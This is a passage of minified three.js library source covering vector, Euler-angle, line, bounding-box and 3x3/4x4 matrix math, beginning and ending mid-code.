this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);this.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);this.z=0>this.z?Math.ceil(this.z):Math.floor(this.z);this.w=0>this.w?Math.ceil(this.w):Math.floor(this.w);return this},negate:function(){this.x=-this.x;this.y=-this.y;this.z=-this.z;this.w=-this.w;return this},dot:function(a){return this.x*a.x+this.y*a.y+this.z*\na.z+this.w*a.w},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)},normalize:function(){return this.divideScalar(this.length())},setLength:function(a){return this.multiplyScalar(a/this.length())},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;this.z+=(a.z-\nthis.z)*b;this.w+=(a.w-this.w)*b;return this},lerpVectors:function(a,b,c){return this.subVectors(b,a).multiplyScalar(c).add(a)},equals:function(a){return a.x===this.x&&a.y===this.y&&a.z===this.z&&a.w===this.w},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];this.z=a[b+2];this.w=a[b+3];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this.x;a[b+1]=this.y;a[b+2]=this.z;a[b+3]=this.w;return a},fromAttribute:function(a,b,c){void 0===c&&(c=0);b=b*a.itemSize+\nc;this.x=a.array[b];this.y=a.array[b+1];this.z=a.array[b+2];this.w=a.array[b+3];return this}};THREE.Euler=function(a,b,c,d){this._x=a||0;this._y=b||0;this._z=c||0;this._order=d||THREE.Euler.DefaultOrder};THREE.Euler.RotationOrders=\"XYZ YZX ZXY XZY YXZ ZYX\".split(\" \");THREE.Euler.DefaultOrder=\"XYZ\";\nTHREE.Euler.prototype={constructor:THREE.Euler,get x(){return this._x},set x(a){this._x=a;this.onChangeCallback()},get y(){return this._y},set y(a){this._y=a;this.onChangeCallback()},get z(){return this._z},set z(a){this._z=a;this.onChangeCallback()},get order(){return this._order},set order(a){this._order=a;this.onChangeCallback()},set:function(a,b,c,d){this._x=a;this._y=b;this._z=c;this._order=d||this._order;this.onChangeCallback();return this},clone:function(){return new this.constructor(this._x,\nthis._y,this._z,this._order)},copy:function(a){this._x=a._x;this._y=a._y;this._z=a._z;this._order=a._order;this.onChangeCallback();return this},setFromRotationMatrix:function(a,b,c){var d=THREE.Math.clamp,e=a.elements;a=e[0];var f=e[4],g=e[8],h=e[1],k=e[5],l=e[9],n=e[2],p=e[6],e=e[10];b=b||this._order;\"XYZ\"===b?(this._y=Math.asin(d(g,-1,1)),.99999>Math.abs(g)?(this._x=Math.atan2(-l,e),this._z=Math.atan2(-f,a)):(this._x=Math.atan2(p,k),this._z=0)):\"YXZ\"===b?(this._x=Math.asin(-d(l,-1,1)),.99999>Math.abs(l)?\n(this._y=Math.atan2(g,e),this._z=Math.atan2(h,k)):(this._y=Math.atan2(-n,a),this._z=0)):\"ZXY\"===b?(this._x=Math.asin(d(p,-1,1)),.99999>Math.abs(p)?(this._y=Math.atan2(-n,e),this._z=Math.atan2(-f,k)):(this._y=0,this._z=Math.atan2(h,a))):\"ZYX\"===b?(this._y=Math.asin(-d(n,-1,1)),.99999>Math.abs(n)?(this._x=Math.atan2(p,e),this._z=Math.atan2(h,a)):(this._x=0,this._z=Math.atan2(-f,k))):\"YZX\"===b?(this._z=Math.asin(d(h,-1,1)),.99999>Math.abs(h)?(this._x=Math.atan2(-l,k),this._y=Math.atan2(-n,a)):(this._x=\n0,this._y=Math.atan2(g,e))):\"XZY\"===b?(this._z=Math.asin(-d(f,-1,1)),.99999>Math.abs(f)?(this._x=Math.atan2(p,k),this._y=Math.atan2(g,a)):(this._x=Math.atan2(-l,e),this._y=0)):console.warn(\"THREE.Euler: .setFromRotationMatrix() given unsupported order: \"+b);this._order=b;if(!1!==c)this.onChangeCallback();return this},setFromQuaternion:function(){var a;return function(b,c,d){void 0===a&&(a=new THREE.Matrix4);a.makeRotationFromQuaternion(b);return this.setFromRotationMatrix(a,c,d)}}(),setFromVector3:function(a,\nb){return this.set(a.x,a.y,a.z,b||this._order)},reorder:function(){var a=new THREE.Quaternion;return function(b){a.setFromEuler(this);return this.setFromQuaternion(a,b)}}(),equals:function(a){return a._x===this._x&&a._y===this._y&&a._z===this._z&&a._order===this._order},fromArray:function(a){this._x=a[0];this._y=a[1];this._z=a[2];void 0!==a[3]&&(this._order=a[3]);this.onChangeCallback();return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this._x;a[b+1]=this._y;a[b+2]=this._z;\na[b+3]=this._order;return a},toVector3:function(a){return a?a.set(this._x,this._y,this._z):new THREE.Vector3(this._x,this._y,this._z)},onChange:function(a){this.onChangeCallback=a;return this},onChangeCallback:function(){}};THREE.Line3=function(a,b){this.start=void 0!==a?a:new THREE.Vector3;this.end=void 0!==b?b:new THREE.Vector3};\nTHREE.Line3.prototype={constructor:THREE.Line3,set:function(a,b){this.start.copy(a);this.end.copy(b);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.start.copy(a.start);this.end.copy(a.end);return this},center:function(a){return(a||new THREE.Vector3).addVectors(this.start,this.end).multiplyScalar(.5)},delta:function(a){return(a||new THREE.Vector3).subVectors(this.end,this.start)},distanceSq:function(){return this.start.distanceToSquared(this.end)},distance:function(){return this.start.distanceTo(this.end)},\nat:function(a,b){var c=b||new THREE.Vector3;return this.delta(c).multiplyScalar(a).add(this.start)},closestPointToPointParameter:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(c,d){a.subVectors(c,this.start);b.subVectors(this.end,this.start);var e=b.dot(b),e=b.dot(a)/e;d&&(e=THREE.Math.clamp(e,0,1));return e}}(),closestPointToPoint:function(a,b,c){a=this.closestPointToPointParameter(a,b);c=c||new THREE.Vector3;return this.delta(c).multiplyScalar(a).add(this.start)},applyMatrix4:function(a){this.start.applyMatrix4(a);\nthis.end.applyMatrix4(a);return this},equals:function(a){return a.start.equals(this.start)&&a.end.equals(this.end)}};THREE.Box2=function(a,b){this.min=void 0!==a?a:new THREE.Vector2(Infinity,Infinity);this.max=void 0!==b?b:new THREE.Vector2(-Infinity,-Infinity)};\nTHREE.Box2.prototype={constructor:THREE.Box2,set:function(a,b){this.min.copy(a);this.max.copy(b);return this},setFromPoints:function(a){this.makeEmpty();for(var b=0,c=a.length;b<c;b++)this.expandByPoint(a[b]);return this},setFromCenterAndSize:function(){var a=new THREE.Vector2;return function(b,c){var d=a.copy(c).multiplyScalar(.5);this.min.copy(b).sub(d);this.max.copy(b).add(d);return this}}(),clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.min.copy(a.min);this.max.copy(a.max);\nreturn this},makeEmpty:function(){this.min.x=this.min.y=Infinity;this.max.x=this.max.y=-Infinity;return this},isEmpty:function(){return this.max.x<this.min.x||this.max.y<this.min.y},center:function(a){return(a||new THREE.Vector2).addVectors(this.min,this.max).multiplyScalar(.5)},size:function(a){return(a||new THREE.Vector2).subVectors(this.max,this.min)},expandByPoint:function(a){this.min.min(a);this.max.max(a);return this},expandByVector:function(a){this.min.sub(a);this.max.add(a);return this},expandByScalar:function(a){this.min.addScalar(-a);\nthis.max.addScalar(a);return this},containsPoint:function(a){return a.x<this.min.x||a.x>this.max.x||a.y<this.min.y||a.y>this.max.y?!1:!0},containsBox:function(a){return this.min.x<=a.min.x&&a.max.x<=this.max.x&&this.min.y<=a.min.y&&a.max.y<=this.max.y?!0:!1},getParameter:function(a,b){return(b||new THREE.Vector2).set((a.x-this.min.x)/(this.max.x-this.min.x),(a.y-this.min.y)/(this.max.y-this.min.y))},intersectsBox:function(a){return a.max.x<this.min.x||a.min.x>this.max.x||a.max.y<this.min.y||a.min.y>\nthis.max.y?!1:!0},clampPoint:function(a,b){return(b||new THREE.Vector2).copy(a).clamp(this.min,this.max)},distanceToPoint:function(){var a=new THREE.Vector2;return function(b){return a.copy(b).clamp(this.min,this.max).sub(b).length()}}(),intersect:function(a){this.min.max(a.min);this.max.min(a.max);return this},union:function(a){this.min.min(a.min);this.max.max(a.max);return this},translate:function(a){this.min.add(a);this.max.add(a);return this},equals:function(a){return a.min.equals(this.min)&&\na.max.equals(this.max)}};THREE.Box3=function(a,b){this.min=void 0!==a?a:new THREE.Vector3(Infinity,Infinity,Infinity);this.max=void 0!==b?b:new THREE.Vector3(-Infinity,-Infinity,-Infinity)};\nTHREE.Box3.prototype={constructor:THREE.Box3,set:function(a,b){this.min.copy(a);this.max.copy(b);return this},setFromArray:function(a){for(var b=Infinity,c=Infinity,d=Infinity,e=-Infinity,f=-Infinity,g=-Infinity,h=0,k=a.length;h<k;h+=3){var l=a[h],n=a[h+1],p=a[h+2];l<b&&(b=l);n<c&&(c=n);p<d&&(d=p);l>e&&(e=l);n>f&&(f=n);p>g&&(g=p)}this.min.set(b,c,d);this.max.set(e,f,g)},setFromPoints:function(a){this.makeEmpty();for(var b=0,c=a.length;b<c;b++)this.expandByPoint(a[b]);return this},setFromCenterAndSize:function(){var a=\nnew THREE.Vector3;return function(b,c){var d=a.copy(c).multiplyScalar(.5);this.min.copy(b).sub(d);this.max.copy(b).add(d);return this}}(),setFromObject:function(){var a=new THREE.Vector3;return function(b){var c=this;b.updateMatrixWorld(!0);this.makeEmpty();b.traverse(function(b){var e=b.geometry;if(void 0!==e)if(e instanceof THREE.Geometry)for(var f=e.vertices,e=0,g=f.length;e<g;e++)a.copy(f[e]),a.applyMatrix4(b.matrixWorld),c.expandByPoint(a);else if(e instanceof THREE.BufferGeometry&&void 0!==\ne.attributes.position)for(f=e.attributes.position.array,e=0,g=f.length;e<g;e+=3)a.fromArray(f,e),a.applyMatrix4(b.matrixWorld),c.expandByPoint(a)});return this}}(),clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.min.copy(a.min);this.max.copy(a.max);return this},makeEmpty:function(){this.min.x=this.min.y=this.min.z=Infinity;this.max.x=this.max.y=this.max.z=-Infinity;return this},isEmpty:function(){return this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z},\ncenter:function(a){return(a||new THREE.Vector3).addVectors(this.min,this.max).multiplyScalar(.5)},size:function(a){return(a||new THREE.Vector3).subVectors(this.max,this.min)},expandByPoint:function(a){this.min.min(a);this.max.max(a);return this},expandByVector:function(a){this.min.sub(a);this.max.add(a);return this},expandByScalar:function(a){this.min.addScalar(-a);this.max.addScalar(a);return this},containsPoint:function(a){return a.x<this.min.x||a.x>this.max.x||a.y<this.min.y||a.y>this.max.y||a.z<\nthis.min.z||a.z>this.max.z?!1:!0},containsBox:function(a){return this.min.x<=a.min.x&&a.max.x<=this.max.x&&this.min.y<=a.min.y&&a.max.y<=this.max.y&&this.min.z<=a.min.z&&a.max.z<=this.max.z?!0:!1},getParameter:function(a,b){return(b||new THREE.Vector3).set((a.x-this.min.x)/(this.max.x-this.min.x),(a.y-this.min.y)/(this.max.y-this.min.y),(a.z-this.min.z)/(this.max.z-this.min.z))},intersectsBox:function(a){return a.max.x<this.min.x||a.min.x>this.max.x||a.max.y<this.min.y||a.min.y>this.max.y||a.max.z<\nthis.min.z||a.min.z>this.max.z?!1:!0},intersectsSphere:function(){var a;return function(b){void 0===a&&(a=new THREE.Vector3);this.clampPoint(b.center,a);return a.distanceToSquared(b.center)<=b.radius*b.radius}}(),intersectsPlane:function(a){var b,c;0<a.normal.x?(b=a.normal.x*this.min.x,c=a.normal.x*this.max.x):(b=a.normal.x*this.max.x,c=a.normal.x*this.min.x);0<a.normal.y?(b+=a.normal.y*this.min.y,c+=a.normal.y*this.max.y):(b+=a.normal.y*this.max.y,c+=a.normal.y*this.min.y);0<a.normal.z?(b+=a.normal.z*\nthis.min.z,c+=a.normal.z*this.max.z):(b+=a.normal.z*this.max.z,c+=a.normal.z*this.min.z);return b<=a.constant&&c>=a.constant},clampPoint:function(a,b){return(b||new THREE.Vector3).copy(a).clamp(this.min,this.max)},distanceToPoint:function(){var a=new THREE.Vector3;return function(b){return a.copy(b).clamp(this.min,this.max).sub(b).length()}}(),getBoundingSphere:function(){var a=new THREE.Vector3;return function(b){b=b||new THREE.Sphere;b.center=this.center();b.radius=.5*this.size(a).length();return b}}(),\nintersect:function(a){this.min.max(a.min);this.max.min(a.max);this.isEmpty()&&this.makeEmpty();return this},union:function(a){this.min.min(a.min);this.max.max(a.max);return this},applyMatrix4:function(){var a=[new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3];return function(b){if(this.isEmpty())return this;a[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(b);a[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(b);\na[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(b);a[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(b);a[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(b);a[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(b);a[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(b);a[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(b);this.setFromPoints(a);return this}}(),translate:function(a){this.min.add(a);this.max.add(a);return this},equals:function(a){return a.min.equals(this.min)&&\na.max.equals(this.max)}};THREE.Matrix3=function(){this.elements=new Float32Array([1,0,0,0,1,0,0,0,1]);0<arguments.length&&console.error(\"THREE.Matrix3: the constructor no longer reads arguments. use .set() instead.\")};\nTHREE.Matrix3.prototype={constructor:THREE.Matrix3,set:function(a,b,c,d,e,f,g,h,k){var l=this.elements;l[0]=a;l[1]=d;l[2]=g;l[3]=b;l[4]=e;l[5]=h;l[6]=c;l[7]=f;l[8]=k;return this},identity:function(){this.set(1,0,0,0,1,0,0,0,1);return this},clone:function(){return(new this.constructor).fromArray(this.elements)},copy:function(a){a=a.elements;this.set(a[0],a[3],a[6],a[1],a[4],a[7],a[2],a[5],a[8]);return this},setFromMatrix4:function(a){a=a.elements;this.set(a[0],a[4],a[8],a[1],a[5],a[9],a[2],a[6],a[10]);\nreturn this},applyToVector3Array:function(){var a;return function(b,c,d){void 0===a&&(a=new THREE.Vector3);void 0===c&&(c=0);void 0===d&&(d=b.length);for(var e=0;e<d;e+=3,c+=3)a.fromArray(b,c),a.applyMatrix3(this),a.toArray(b,c);return b}}(),applyToBuffer:function(){var a;return function(b,c,d){void 0===a&&(a=new THREE.Vector3);void 0===c&&(c=0);void 0===d&&(d=b.length/b.itemSize);for(var e=0;e<d;e++,c++)a.x=b.getX(c),a.y=b.getY(c),a.z=b.getZ(c),a.applyMatrix3(this),b.setXYZ(a.x,a.y,a.z);return b}}(),\nmultiplyScalar:function(a){var b=this.elements;b[0]*=a;b[3]*=a;b[6]*=a;b[1]*=a;b[4]*=a;b[7]*=a;b[2]*=a;b[5]*=a;b[8]*=a;return this},determinant:function(){var a=this.elements,b=a[0],c=a[1],d=a[2],e=a[3],f=a[4],g=a[5],h=a[6],k=a[7],a=a[8];return b*f*a-b*g*k-c*e*a+c*g*h+d*e*k-d*f*h},getInverse:function(a,b){a instanceof THREE.Matrix4&&console.error(\"THREE.Matrix3.getInverse no longer takes a Matrix4 argument.\");var c=a.elements,d=this.elements,e=c[0],f=c[1],g=c[2],h=c[3],k=c[4],l=c[5],n=c[6],p=c[7],\nc=c[8],m=c*k-l*p,q=l*n-c*h,r=p*h-k*n,s=e*m+f*q+g*r;if(0===s){if(b)throw Error(\"THREE.Matrix3.getInverse(): can't invert matrix, determinant is 0\");console.warn(\"THREE.Matrix3.getInverse(): can't invert matrix, determinant is 0\");return this.identity()}s=1/s;d[0]=m*s;d[1]=(g*p-c*f)*s;d[2]=(l*f-g*k)*s;d[3]=q*s;d[4]=(c*e-g*n)*s;d[5]=(g*h-l*e)*s;d[6]=r*s;d[7]=(f*n-p*e)*s;d[8]=(k*e-f*h)*s;return this},transpose:function(){var a,b=this.elements;a=b[1];b[1]=b[3];b[3]=a;a=b[2];b[2]=b[6];b[6]=a;a=b[5];b[5]=\nb[7];b[7]=a;return this},flattenToArrayOffset:function(a,b){console.warn(\"THREE.Matrix3: .flattenToArrayOffset is deprecated - just use .toArray instead.\");return this.toArray(a,b)},getNormalMatrix:function(a){return this.setFromMatrix4(a).getInverse(this).transpose()},transposeIntoArray:function(a){var b=this.elements;a[0]=b[0];a[1]=b[3];a[2]=b[6];a[3]=b[1];a[4]=b[4];a[5]=b[7];a[6]=b[2];a[7]=b[5];a[8]=b[8];return this},fromArray:function(a){this.elements.set(a);return this},toArray:function(a,b){void 0===\na&&(a=[]);void 0===b&&(b=0);var c=this.elements;a[b]=c[0];a[b+1]=c[1];a[b+2]=c[2];a[b+3]=c[3];a[b+4]=c[4];a[b+5]=c[5];a[b+6]=c[6];a[b+7]=c[7];a[b+8]=c[8];return a}};THREE.Matrix4=function(){this.elements=new Float32Array([1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1]);0<arguments.length&&console.error(\"THREE.Matrix4: the constructor no longer reads arguments. use .set() instead.\")};\nTHREE.Matrix4.prototype={constructor:THREE.Matrix4,set:function(a,b,c,d,e,f,g,h,k,l,n,p,m,q,r,s){var t=this.elements;t[0]=a;t[4]=b;t[8]=c;t[12]=d;t[1]=e;t[5]=f;t[9]=g;t[13]=h;t[2]=k;t[6]=l;t[10]=n;t[14]=p;t[3]=m;t[7]=q;t[11]=r;t[15]=s;return this},identity:function(){this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1);return this},clone:function(){return(new THREE.Matrix4).fromArray(this.elements)},copy:function(a){this.elements.set(a.elements);return this},copyPosition:function(a){var b=this.elements;a=a.elements;\nb[12]=a[12];b[13]=a[13];b[14]=a[14];return this},extractBasis:function(a,b,c){a.setFromMatrixColumn(this,0);b.setFromMatrixColumn(this,1);c.setFromMatrixColumn(this,2);return this},makeBasis:function(a,b,c){this.set(a.x,b.x,c.x,0,a.y,b.y,c.y,0,a.z,b.z,c.z,0,0,0,0,1);return this},extractRotation:function(){var a;return function(b){void 0===a&&(a=new THREE.Vector3);var c=this.elements,d=b.elements,e=1/a.setFromMatrixColumn(b,0).length(),f=1/a.setFromMatrixColumn(b,1).length();b=1/a.setFromMatrixColumn(b,\n2).length();c[0]=d[0]*e;c[1]=d[1]*e;c[2]=d[2]*e;c[4]=d[4]*f;c[5]=d[5]*f;c[6]=d[6]*f;c[8]=d[8]*b;c[9]=d[9]*b;c[10]=d[10]*b;return this}}(),makeRotationFromEuler:function(a){!1===a instanceof THREE.Euler&&console.error(\"THREE.Matrix: .makeRotationFromEuler() now expects a Euler rotation rather than a Vector3 and order.\");var b=this.elements,c=a.x,d=a.y,e=a.z,f=Math.cos(c),c=Math.sin(c),g=Math.cos(d),d=Math.sin(d),h=Math.cos(e),e=Math.sin(e);if(\"XYZ\"===a.order){a=f*h;var k=f*e,l=c*h,n=c*e;b[0]=g*h;b[4]=\n-g*e;b[8]=d;b[1]=k+l*d;b[5]=a-n*d;b[9]=-c*g;b[2]=n-a*d;b[6]=l+k*d;b[10]=f*g}else\"YXZ\"===a.order?(a=g*h,k=g*e,l=d*h,n=d*e,b[0]=a+n*c,b[4]=l*c-k,b[8]=f*d,b[1]=f*e,b[5]=f*h,b[9]=-c,b[2]=k*c-l,b[6]=n+a*c,b[10]=f*g):\"ZXY\"===a.order?(a=g*h,k=g*e,l=d*h,n=d*e,b[0]=a-n*c,b[4]=-f*e,b[8]=l+k*c,b[1]=k+l*c,b[5]=f*h,b[9]=n-a*c,b[2]=-f*d,b[6]=c,b[10]=f*g):\"ZYX\"===a.order?(a=f*h,k=f*e,l=c*h,n=c*e,b[0]=g*h,b[4]=l*d-k,b[8]=a*d+n,b[1]=g*e,b[5]=n*d+a,b[9]=k*d-l,b[2]=-d,b[6]=c*g,b[10]=f*g):\"YZX\"===a.order?(a=f*g,k=f*\nd,l=c*g,n=c*d,b[0]=g*h,b[4]=n-a*e,b[8]=l*e+k,b[1]=e,b[5]=f*h,b[9]=-c*h,b[2]=-d*h,b[6]=k*e+l,b[10]=a-n*e):\"XZY\"===a.order&&(a=f*g,k=f*d,l=c*g,n=c*d,b[0]=g*h,b[4]=-e,b[8]=d*h,b[1]=a*e+n,b[5]=f*h,b[9]=k*e-l,b[2]=l*e-k,b[6]=c*h,b[10]=n*e+a);b[3]=0;b[7]=0;b[11]=0;b[12]=0;b[13]=0;b[14]=0;b[15]=1;return this},makeRotationFromQuaternion:function(a){var b=this.elements,c=a.x,d=a.y,e=a.z,f=a.w,g=c+c,h=d+d,k=e+e;a=c*g;var l=c*h,c=c*k,n=d*h,d=d*k,e=e*k,g=f*g,h=f*h,f=f*k;b[0]=1-(n+e);b[4]=l-f;b[8]=c+h;b[1]=l+\nf;b[5]=1-(a+e);b[9]=d-g;b[2]=c-h;b[6]=d+g;b[10]=1-(a+n);b[3]=0;b[7]=0;b[11]=0;b[12]=0;b[13]=0;b[14]=0;b[15]=1;return this},lookAt:function(){var a,b,c;return function(d,e,f){void 0===a&&(a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Vector3);var g=this.elements;c.subVectors(d,e).normalize();0===c.lengthSq()&&(c.z=1);a.crossVectors(f,c).normalize();0===a.lengthSq()&&(c.z+=1E-4,a.crossVectors(f,c).normalize());b.crossVectors(c,a);g[0]=a.x;g[4]=b.x;g[8]=c.x;g[1]=a.y;g[5]=b.y;g[9]=c.y;g[2]=a.z;\ng[6]=b.z;g[10]=c.z;return this}}(),multiply:function(a,b){return void 0!==b?(console.warn(\"THREE.Matrix4: .multiply() now only accepts one argument. Use .multiplyMatrices( a, b ) instead.\"),this.multiplyMatrices(a,b)):this.multiplyMatrices(this,a)},premultiply:function(a){return this.multiplyMatrices(a,this)},multiplyMatrices:function(a,b){var c=a.elements,d=b.elements,e=this.elements,f=c[0],g=c[4],h=c[8],k=c[12],l=c[1],n=c[5],p=c[9],m=c[13],q=c[2],r=c[6],s=c[10],t=c[14],u=c[3],v=c[7],C=c[11],c=c[15],\nw=d[0],E=d[4],z=d[8],y=d[12],A=d[1],I=d[5],B=d[9],F=d[13],K=d[2],P=d[6],M=d[10],H=d[14],L=d[3],O=d[7],N=d[11],d=d[15];e[0]=f*w+g*A+h*K+k*L;e[4]=f*E+g*I+h*P+k*O;e[8]=f*z+g*B+h*M+k*N;e[12]=f*y+g*F+h*H+k*d;e[1]=l*w+n*A+p*K+m*L;e[5]=l*E+n*I+p*P+m*O;e[9]=l*z+n*B+p*M+m*N;e[13]=l*y+n*F+p*H+m*d;e[2]=q*w+r*A+s*K+t*L;e[6]=q*E+r*I+s*P+t*O;e[10]=q*z+r*B+s*M+t*N;e[14]=q*y+r*F+s*H+t*d;e[3]=u*w+v*A+C*K+c*L;e[7]=u*E+v*I+C*P+c*O;e[11]=u*z+v*B+C*M+c*N;e[15]=u*y+v*F+C*H+c*d;return this},multiplyToArray:function(a,b,\nc){var d=this.elements;this.multiplyMatrices(a,b);c[0]=d[0];c[1]=d[1];c[2]=d[2];c[3]=d[3];c[4]=d[4];c[5]=d[5];c[6]=d[6];c[7]=d[7];c[8]=d[8];c[9]=d[9];c[10]=d[10];c[11]=d[11];c[12]=d[12];c[13]=d[13];c[14]=d[14];c[15]=d[15];return this},multiplyScalar:function(a){var b=this.elements;b[0]*=a;b[4]*=a;b[8]*=a;b[12]*=a;b[1]*=a;b[5]*=a;b[9]*=a;b[13]*=a;b[2]*=a;b[6]*=a;b[10]*=a;b[14]*=a;b[3]*=a;b[7]*=a;b[11]*=a;b[15]*=a;return this},applyToVector3Array:function(){var a;return function(b,c,d){void 0===a&&\n(a=new THREE.Vector3);void 0===c&&(c=0);void 0===d&&(d=b.length);for(var e=0;e<d;e+=3,c+=3)a.fromArray(b,c),a.applyMatrix4(this),a.toArray(b,c);return b}}(),applyToBuffer:function(){var a;return function(b,c,d){void 0===a&&(a=new THREE.Vector3);void 0===c&&(c=0);void 0===d&&(d=b.length/b.itemSize);for(var e=0;e<d;e++,c++)a.x=b.getX(c),a.y=b.getY(c),a.z=b.getZ(c),a.applyMatrix4(this),b.setXYZ(a.x,a.y,a.z);return b}}(),determinant:function(){var a=this.elements,b=a[0],c=a[4],d=a[8],e=a[12],f=a[1],g=\na[5],h=a[9],k=a[13],l=a[2],n=a[6],p=a[10],m=a[14];return a[3]*(+e*h*n-d*k*n-e*g*p+c*k*p+d*g*m-c*h*m)+a[7]*(+b*h*m-b*k*p+e*f*p-d*f*m+d*k*l-e*h*l)+a[11]*(+b*k*n-b*g*m-e*f*n+c*f*m+e*g*l-c*k*l)+a[15]*(-d*g*l-b*h*n+b*g*p+d*f*n-c*f*p+c*h*l)},transpose:function(){var a=this.elements,b;b=a[1];a[1]=a[4];a[4]=b;b=a[2];a[2]=a[8];a[8]=b;b=a[6];a[6]=a[9];a[9]=b;b=a[3];a[3]=a[12];a[12]=b;b=a[7];a[7]=a[13];a[13]=b;b=a[11];a[11]=a[14];a[14]=b;return this},flattenToArrayOffset:function(a,b){console.warn(\"THREE.Matrix3: .flattenToArrayOffset is deprecated - just use .toArray instead.\");\nreturn this.toArray(a,b)},getPosition:function(){var a;return function(){void 0===a&&(a=new THREE.Vector3);console.warn(\"THREE.Matrix4: .getPosition() has been removed. Use Vector3.setFromMatrixPosition( matrix ) instead.\");return a.setFromMatrixColumn(this,3)}}(),setPosition:function(a){var b=this.elements;b[12]=a.x;b[13]=a.y;b[14]=a.z;return this},getInverse:function(a,b){var c=this.elements,d=a.elements,e=d[0],f=d[1],g=d[2],h=d[3],k=d[4],l=d[5],n=d[6],p=d[7],m=d[8],q=d[9],r=d[10],s=d[11],t=d[12],\nu=d[13],v=d[14],d=d[15],C=q*v*p-u*r*p+u*n*s-l*v*s-q*n*d+l*r*d,w=t*r*p-m*v*p-t*n*s+k*v*s+m*n*d-k*r*d,E=m*u*p-t*q*p+t*l*s-k*u*s-m*l*d+k*q*d,z=t*q*n-m*u*n-t*l*r+k*u*r+m*l*v-k*q*v,y=e*C+f*w+g*E+h*z;if(0===y){if(b)throw Error(\"THREE.Matrix4.getInverse(): can't invert matrix, determinant is 0\");console.warn(\"THREE.Matrix4.getInverse(): can't invert matrix, determinant is 0\");return this.identity()}y=1/y;c[0]=C*y;c[1]=(u*r*h-q*v*h-u*g*s+f*v*s+q*g*d-f*r*d)*y;c[2]=(l*v*h-u*n*h+u*g*p-f*v*p-l*g*d+f*n*d)*y;c[3]=\n(q*n*h-l*r*h-q*g*p+f*r*p+l*g*s-f*n*s)*y;c[4]=w*y;c[5]=(m*v*h-t*r*h+t*g*s-e*v*s-m*g*d+e*r*d)*y;c[6]=(t*n*h-k*v*h-t*g*p+e*v*p+k*g*d-e*n*d)*y;c[7]=(k*r*h-m*n*h+m*g*p-e*r*p-k*g*s+e*n*s)*y;c[8]=E*y;c[9]=(t*q*h-m*u*h-t*f*s+e*u*s+m*f*d-e*q*d)*y;c[10]=(k*u*h-t*l*h+t*f*p-e*u*p-k*f*d+e*l*d)*y;c[11]=(m*l*h-k*q*h-m*f*p+e*q*p+k*f*s-e*l*s)*y;c[12]=z*y;c[13]=(m*u*g-t*q*g+t*f*r-e*u*r-m*f*v+e*q*v)*y;c[14]=(t*l*g-k*u*g-t*f*n+e*u*n+k*f*v-e*l*v)*y;c[15]=(k*q*g-m*l*g+m*f*n-e*q*n-k*f*r+e*l*r)*y;return this},scale:function(a){var b=\nthis.elements,c=a.x,d=a.y;a=a.z;b[0]*=c;b[4]*=d;b[8]*=a;b[1]*=c;b[5]*=d;b[9]*=a;b[2]*=c;b[6]*=d;b[10]*=a;b[3]*=c;b[7]*=d;b[11]*=a;return this},getMaxScaleOnAxis:function(){var a=this.elements;return Math.sqrt(Math.max(a[0]*a[0]+a[1]*a[1]+a[2]*a[2],a[4]*a[4]+a[5]*a[5]+a[6]*a[6],a[8]*a[8]+a[9]*a[9]+a[10]*a[10]))},makeTranslation:function(a,b,c){this.set(1,0,0,a,0,1,0,b,0,0,1,c,0,0,0,1);return this},makeRotationX:function(a){var b=Math.cos(a);a=Math.sin(a);this.set(1,0,0,0,0,b,-a,0,0,a,b,0,0,0,0,1);\nreturn this},makeRotationY:function(a){var b=Math.cos(a);a=Math.sin(a);this.set(b,0,a,0,0,1,0,0,-a,0,b,0,0,0,0,1);return this},makeRotationZ:function(a){var b=Math.cos(a);a=Math.sin(a);this.set(b,-a,0,0,a,b,0,0,0,0,1,0,0,0,0,1);return this},makeRotationAxis:function(a,b){var c=Math.cos(b),d=Math.sin(b),e=1-c,f=a.x,g=a.y,h=a.z,k=e*f,l=e*g;this.set(k*f+c,k*g-d*h,k*h+d*g,0,k*g+d*h,l*g+c,l*h-d*f,0,k*h-d*g,l*h+d*f,e*h*h+c,0,0,0,0,1);return this},makeScale:function(a,b,c){this.set(a,0,0,0,0,b,0,0,0,0,c,\n0,0,0,0,1);return this},compose:function(a,b,c){this.makeRotationFromQuaternion(b);this.scale(c);this.setPosition(a);return this},decompose:function(){var a,b;return function(c,d,e){void 0===a&&(a=new THREE.Vector3,b=new THREE.Matrix4);var f=this.elements,g=a.set(f[0],f[1],f[2]).length(),h=a.set(f[4],f[5],f[6]).length(),k=a.set(f[8],f[9],f[10]).length();0>this.determinant()&&(g=-g);c.x=f[12];c.y=f[13];c.z=f[14];b.elements.set(this.elements);c=1/g;var f=1/h,l=1/k;b.elements[0]*=c;b.elements[1]*=c;\nb.elements[2]*=c;b.elements[4]*=f;b.elements[5]*=f;b.elements[6]*=f;b.elements[8]*=l;b.elements[9]*=l;b.elements[10]*=l;d.setFromRotationMatrix(b);e.x=g;e.y=h;e.z=k;return 